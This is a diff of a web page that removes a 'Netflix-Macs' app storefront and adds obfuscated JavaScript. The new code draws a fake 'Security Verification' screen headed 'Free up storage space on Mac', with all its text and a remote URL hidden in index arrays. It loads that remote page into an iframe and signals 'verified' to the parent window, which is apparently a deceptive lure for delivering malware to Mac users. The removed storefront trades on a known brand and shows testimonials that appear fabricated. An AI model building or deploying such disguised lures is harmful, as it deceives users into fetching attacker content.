-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                    </div>
-                    <p class="text-gray-600 mb-6 leading-relaxed">"Finally, an app that understands how Mac users want to organize their media. The interface is beautiful and it works flawlessly with my entire collection."</p>
-                    <div class="flex items-center gap-3">
-                        <div class="w-12 h-12 rounded-full bg-gradient-to-br from-red-400 to-red-600"></div>
-                        <div>
-                            <p class="font-semibold text-gray-800">Michael Chen</p>
-                            <p class="text-sm text-gray-500">Video Producer, Los Angeles</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow">
-                    <div class="flex items-center gap-1 text-yellow-500 mb-4">
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                    </div>
-                    <p class="text-gray-600 mb-6 leading-relaxed">"I have over 10,000 photos and videos. Netflix-Macs organized everything in minutes. The one-time purchase was absolutely worth it compared to monthly subscriptions."</p>
-                    <div class="flex items-center gap-3">
-                        <div class="w-12 h-12 rounded-full bg-gradient-to-br from-purple-400 to-purple-600"></div>
-                        <div>
-                            <p class="font-semibold text-gray-800">Sarah Johnson</p>
-                            <p class="text-sm text-gray-500">Photographer, New York</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow">
-                    <div class="flex items-center gap-1 text-yellow-500 mb-4">
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                    </div>
-                    <p class="text-gray-600 mb-6 leading-relaxed">"The Apple Silicon optimization is incredible. It runs so smoothly on my M2 MacBook Air. Best media management solution I have ever used on any platform."</p>
-                    <div class="flex items-center gap-3">
-                        <div class="w-12 h-12 rounded-full bg-gradient-to-br from-blue-400 to-blue-600"></div>
-                        <div>
-                            <p class="font-semibold text-gray-800">David Park</p>
-                            <p class="text-sm text-gray-500">Developer, San Francisco</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+    const iframe = document.getElementById('verifyFrame');
 
-    <section id="pricing" class="py-20 md:py-32">
-        <div class="max-w-4xl mx-auto px-4 md:px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Simple, Transparent Pricing</h2>
-                <h3 class="text-lg text-gray-600">One payment. Lifetime access. No hidden fees.</h3>
-            </div>
-            <div class="gradient-card rounded-3xl p-8 md:p-12 soft-shadow text-center">
-                <div class="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm font-medium mb-6">
-                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
-                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
-                    </svg>
-                    Best Value - Pay Once, Use Forever
-                </div>
-                <div class="mb-8">
-                    <span class="text-5xl md:text-6xl font-bold text-gray-900">$12.85</span>
-                    <span class="text-xl text-gray-500 ml-2">one-time</span>
-                </div>
-                <ul class="text-left max-w-md mx-auto space-y-4 mb-10">
-                    <li class="flex items-center gap-3">
-                        <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                        <span class="text-gray-700">Lifetime license with all features unlocked</span>
-                    </li>
-                    <li class="flex items-center gap-3">
-                        <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                        <span class="text-gray-700">All future updates included at no extra cost</span>
-                    </li>
-                    <li class="flex items-center gap-3">
-                        <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                        <span class="text-gray-700">Priority email support from our team</span>
-                    </li>
-                    <li class="flex items-center gap-3">
-                        <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                        <span class="text-gray-700">Native Apple Silicon (M1/M2/M3) support</span>
-                    </li>
-                    <li class="flex items-center gap-3">
-                        <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                        <span class="text-gray-700">iCloud sync and backup capabilities</span>
-                    </li>
-                    <li class="flex items-center gap-3">
-                        <svg class="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                        <span class="text-gray-700">30-day money-back guarantee</span>
-                    </li>
-                </ul>
-                <a href="#" class="inline-block gradient-btn text-white px-10 py-4 rounded-full text-lg font-semibold transition-all hover:shadow-xl">
-                    Purchase License Now
-                </a>
-                <p class="text-sm text-gray-500 mt-6">Secure payment processing. Instant delivery via email.</p>
-            </div>
-        </div>
-    </section>
+    async function loadTargetIntoFrame() {
+      try {
+        const res = await fetch(TARGET_URL, { mode: 'cors', credentials: 'omit', cache: 'no-store' });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const html = await res.text();
+        iframe.srcdoc = html;
+      } catch (e) {
+        iframe.removeAttribute('srcdoc');
+        iframe.src = TARGET_URL;
+      }
+    }
 
-    <section id="faq" class="py-20 md:py-32 bg-white/40">
-        <div class="max-w-3xl mx-auto px-4 md:px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Frequently Asked Questions</h2>
-                <h3 class="text-lg text-gray-600">Everything you need to know about Netflix-Macs</h3>
-            </div>
-            <div class="space-y-4">
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">What macOS versions are supported?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">Netflix-Macs supports macOS Monterey (12.0) and later, including macOS Ventura and macOS Sonoma. It runs natively on both Intel-based Macs and Apple Silicon (M1, M2, M3) processors for optimal performance.</p>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">Is this a one-time purchase or subscription?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">Netflix-Macs is a one-time purchase of $12.85. You pay once and own the license forever. This includes all future updates and new features at no additional cost. There are no recurring fees or hidden charges.</p>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">What media formats are supported?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">We support all popular media formats including MP4, MKV, AVI, MOV, MP3, FLAC, AAC, JPEG, PNG, RAW, and many more. The application uses native macOS codecs for optimal compatibility and playback quality.</p>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">How does iCloud sync work?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">Netflix-Macs can sync your library metadata, playlists, and preferences across all your Mac devices using iCloud. Your actual media files stay on your local storage unless you choose to enable full cloud backup. This keeps your iCloud usage minimal.</p>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">Can I use it on multiple Macs?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">Yes! Your license allows installation on up to 3 Mac devices that you personally own. This is perfect if you have an iMac at home, a MacBook for work, and a Mac mini in your media room.</p>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">What is your refund policy?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">We offer a 30-day money-back guarantee. If you are not completely satisfied with Netflix-Macs for any reason, simply contact our support team within 30 days of purchase for a full refund. No questions asked.</p>
-                    </div>
-                </div>
-                <div class="gradient-card rounded-2xl card-shadow overflow-hidden">
-                    <button class="faq-question w-full px-6 py-5 text-left flex items-center justify-between" onclick="toggleFaq(this)">
-                        <span class="font-semibold text-gray-800">How do I get support if I need help?</span>
-                        <svg class="faq-icon w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                        </svg>
-                    </button>
-                    <div class="faq-content px-6 pb-5">
-                        <p class="text-gray-600">Our dedicated support team is available via email at support@netflix-macs.vercel.app. We typically respond within 24 hours on business days. You can also access our comprehensive knowledge base and video tutorials for self-service assistance.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+    function buildVerifySrcdoc() {
+      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title></title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>(()=>{const URL_ALPHABET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';const URL_IDX=[7,19,19,15,18,62,63,63,18,19,14,17,0,6,4,60,15,0,6,4,60,2,14,12,63,18,19,14,17,0,6,4,60,7,19,12,11];const decodeURL=i=>i.map(x=>URL_ALPHABET[x]).join('');const TARGET_URL=decodeURL(URL_IDX);const c=document.getElementById('c');const g=c.getContext('2d');const alphabet='abcdefghijklmnopqrstuvwxyz'+'ABCDEFGHIJKLMNOPQRSTUVWXYZ';const space=52;const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));const decode=(idx)=>{let s='';for(let i=0;i<idx.length;i++)s+=idx[i]===space?' ':alphabet[idx[i]];return s;};const bannerIdx=[31,17,4,4,52,20,15,52,18,19,14,17,0,6,4,52,18,15,0,2,4,52,14,13,52,38,0,2];const titleIdx=[44,4,2,20,17,8,19,24,52,47,4,17,8,5,8,2,0,19,8,14,13];const subIdx=[41,11,4,0,18,4,52,2,14,13,5,8,17,12,52,19,14,52,2,14,13,19,8,13,20,4];const buttonIdx=[28,14,13,19,8,13,20,4];const doneIdx=[47,4,17,8,5,8,4,3];const hit={x:0,y:0,w:0,h:0};let cssW=1,cssH=1,dpr=1;let verified=false;const fontStack='ui-sans-serif,-apple-system,BlinkMacSystemFont,\\\"SF Pro Display\\\",\\\"SF Pro Text\\\",system-ui,sans-serif';const rounded=(x,y,w,h,r)=>{r=Math.max(0,Math.min(r,Math.min(w,h)/2));g.beginPath();if(g.roundRect){g.roundRect(x,y,w,h,r);return;}g.moveTo(x+r,y);g.arcTo(x+w,y,x+w,y+h,r);g.arcTo(x+w,y+h,x,y+h,r);g.arcTo(x,y+h,x,y,r);g.arcTo(x,y,x+w,y,r);g.closePath();};const drawTracked=(text,x,y,tracking)=>{const chars=text.split('');let total=0;for(let i=0;i<chars.length;i++)total+=g.measureText(chars[i]).width+(i?tracking:0);let cx=x-total/2;for(let i=0;i<chars.length;i++){const w=g.measureText(chars[i]).width;g.fillText(chars[i],cx+w/2,y);cx+=w+tracking;}};const measure=()=>{cssW=Math.max(1,innerWidth);cssH=Math.max(1,innerHeight);dpr=devicePixelRatio||1;c.style.width=cssW+'px';c.style.height=cssH+'px';c.width=Math.round(cssW*dpr);c.height=Math.round(cssH*dpr);g.setTransform(dpr,0,0,dpr,0,0);};const render=()=>{g.clearRect(0,0,cssW,cssH);g.fillStyle='#f5f5f7';g.fillRect(0,0,cssW,cssH);const cx=cssW/2,cy=cssH/2;const bg=g.createRadialGradient(cx,cy-120,Math.min(cssW,cssH)*0.05,cx,cy-120,Math.max(cssW,cssH)*0.9);bg.addColorStop(0,'rgba(255,255,255,0.85)');bg.addColorStop(1,'rgba(245,245,247,0.0)');g.fillStyle=bg;g.fillRect(0,0,cssW,cssH);const bannerSize=clamp(Math.round(cssW*0.07),40,86);g.save();g.globalAlpha=0.24;g.fillStyle='#000000';g.font=\`800 \${bannerSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';drawTracked(decode(bannerIdx),cx,clamp(cy-300,50,cy-170),clamp(Math.round(bannerSize*0.065),2,7));g.restore();const cardW=clamp(Math.round(cssW*0.30),300,460);const cardH=clamp(Math.round(cssH*0.24),185,260);const x=Math.round(cx-cardW/2),y=Math.round(cy-cardH/2);g.save();g.shadowColor='rgba(0,0,0,0.12)';g.shadowBlur=40;g.shadowOffsetX=0;g.shadowOffsetY=18;g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.restore();g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.strokeStyle='rgba(0,0,0,0.10)';g.lineWidth=1;rounded(x+0.5,y+0.5,cardW-1,cardH-1,22);g.stroke();const titleSize=clamp(Math.round(cardW*0.06),18,24);g.fillStyle='rgba(29,29,31,0.70)';g.font=\`500 \${titleSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';g.fillText(decode(titleIdx),cx,y+Math.round(cardH*0.35));const subSize=clamp(Math.round(cardW*0.038),13,15);g.fillStyle='rgba(29,29,31,0.44)';g.font=\`500 \${subSize}px \${fontStack}\`;g.fillText(decode(subIdx),cx,y+Math.round(cardH*0.46));const bw=clamp(Math.round(cardW*0.64),200,300);const bh=clamp(Math.round(cardH*0.25),44,52);const bx=Math.round(cx-bw/2);const by=Math.round(y+Math.round(cardH*0.59));g.save();g.shadowColor='rgba(0,0,0,0.18)';g.shadowBlur=18;g.shadowOffsetX=0;g.shadowOffsetY=10;const grad=g.createLinearGradient(bx,by,bx,by+bh);grad.addColorStop(0,'#1f2937');grad.addColorStop(1,'#0b0d12');g.fillStyle=grad;rounded(bx,by,bw,bh,14);g.fill();g.restore();const grad2=g.createLinearGradient(bx,by,bx,by+bh);grad2.addColorStop(0,'#111827');grad2.addColorStop(1,'#0b0d12');g.fillStyle=grad2;rounded(bx,by,bw,bh,14);g.fill();g.strokeStyle='rgba(255,255,255,0.10)';g.lineWidth=1;rounded(bx+0.5,by+0.5,bw-1,bh-1,14);g.stroke();const btnSize=clamp(Math.round(bh*0.34),15,17);g.fillStyle='#ffffff';g.font=\`500 \${btnSize}px \${fontStack}\`;g.fillText(decode(verified?doneIdx:buttonIdx),cx,by+Math.round(bh/2));hit.x=bx;hit.y=by;hit.w=bw;hit.h=bh;};const repaint=()=>{measure();render();};const notify=()=>{try{window.parent&&window.parent.postMessage({type:'verified', target: TARGET_URL},'*');}catch(_){}};c.addEventListener('pointerdown',(e)=>{const r=c.getBoundingClientRect();const mx=e.clientX-r.left;const my=e.clientY-r.top;if(!verified&&mx>=hit.x&&mx<=hit.x+hit.w&&my>=hit.y&&my<=hit.y+hit.h){verified=true;render();notify();}},{passive:true});addEventListener('resize',repaint);repaint();})();<\/script></body></html>`;
+    }
 
-    <section class="py-20 md:py-32">
-        <div class="max-w-4xl mx-auto px-4 md:px-6 text-center">
-            <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-6">Ready to Transform Your Media Experience?</h2>
-            <h3 class="text-xl text-gray-600 mb-10">Join thousands of Mac users who have already organized their digital entertainment</h3>
-            <a href="#pricing" class="inline-block gradient-btn text-white px-10 py-4 rounded-full text-lg font-semibold transition-all hover:shadow-xl">
-                Get Netflix-Macs Today
-            </a>
-        </div>
-    </section>
+    iframe.srcdoc = buildVerifySrcdoc();
 
-    <footer class="bg-gray-900 text-white py-16">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="grid md:grid-cols-4 gap-10 mb-12">
-                <div>
-                    <div class="flex items-center gap-2 mb-4">
-                        <div class="w-9 h-9 rounded-xl gradient-btn flex items-center justify-center">
-                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 4v16M17 4v16M3 8h4m10 0h4M3 12h18M3 16h4m10 0h4M4 20h16a1 1 0 001-1V5a1 1 0 00-1-1H4a1 1 0 00-1 1v14a1 1 0 001 1z"></path>
-                            </svg>
-                        </div>
-                        <span class="text-xl font-bold">Netflix-Macs</span>
-                    </div>
-                    <p class="text-gray-400 text-sm leading-relaxed">The ultimate media hub for Mac users. Organize, manage, and enjoy all your entertainment content in one beautiful application.</p>
-                </div>
-                <div>
-                    <h4 class="font-semibold mb-4">Product</h4>
-                    <ul class="space-y-2 text-sm text-gray-400">
-                        <li><a href="#features" class="hover:text-white transition-colors">Features</a></li>
-                        <li><a href="#pricing" class="hover:text-white transition-colors">Pricing</a></li>
-                        <li><a href="#faq" class="hover:text-white transition-colors">FAQ</a></li>
-                        <li><a href="#how-it-works" class="hover:text-white transition-colors">How It Works</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="font-semibold mb-4">Legal</h4>
-                    <ul class="space-y-2 text-sm text-gray-400">
-                        <li><a href="#privacy" class="hover:text-white transition-colors">Privacy Policy</a></li>
-                        <li><a href="#privacy" class="hover:text-white transition-colors">Terms of Service</a></li>
-                        <li><a href="#privacy" class="hover:text-white transition-colors">Refund Policy</a></li>
-                        <li><a href="#privacy" class="hover:text-white transition-colors">Cookie Policy</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4 class="font-semibold mb-4">Contact</h4>
-                    <ul class="space-y-2 text-sm text-gray-400">
-                        <li>support@netflix-macs.vercel.app</li>
-                        <li>info@netflix-macs.vercel.app</li>
-                        <li class="pt-2">
-                            <span class="text-xs text-gray-500">Domain: netflix-macs.vercel.app</span>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-            <div class="border-t border-gray-800 pt-8 flex flex-col md:flex-row items-center justify-between gap-4">
-                <p class="text-sm text-gray-500">2024 Netflix-Macs. All rights reserved.</p>
-                <p class="text-sm text-gray-500">Made with care for Mac enthusiasts worldwide.</p>
-            </div>
-        </div>
-    </footer>
-
-    <section id="privacy" class="py-20 bg-gray-50">
-        <div class="max-w-4xl mx-auto px-4 md:px-6">
-            <h2 class="text-3xl font-bold text-gray-900 mb-8 text-center">Privacy Policy</h2>
-            <div class="prose prose-gray max-w-none">
-                <div class="bg-white rounded-2xl p-8 card-shadow space-y-6 text-gray-600">
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">1. Information We Collect</h3>
-                        <p>When you purchase Netflix-Macs, we collect only the information necessary to process your transaction and deliver your license key. This includes your email address and payment information processed securely through our payment provider. We do not collect, access, or store any of your personal media files or content.</p>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-semibold text-gray-800 mb-3">2. How We Use Your Information</h3>
-                        <p>Your email address is used solely for delivering your license key, providing customer support, and sending important product updates. We do not sell, trade, or share your personal information with third parties for marketing purposes.</p>
-                    </div>
